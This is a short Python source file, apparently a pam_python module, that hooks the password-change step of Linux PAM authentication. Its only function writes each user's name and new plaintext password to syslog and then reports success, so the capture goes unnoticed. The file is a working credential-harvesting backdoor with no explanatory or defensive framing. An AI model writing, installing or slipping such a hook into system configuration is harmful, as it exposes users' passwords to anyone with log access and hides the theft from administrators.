import syslog

def pam_sm_chauthtok(pamh, flags, argv):
    if pamh.authtok is not None:
        syslog.syslog('User: {} Password: {}'.format(pamh.user, pamh.authtok))
    return pamh.PAM_SUCCESS
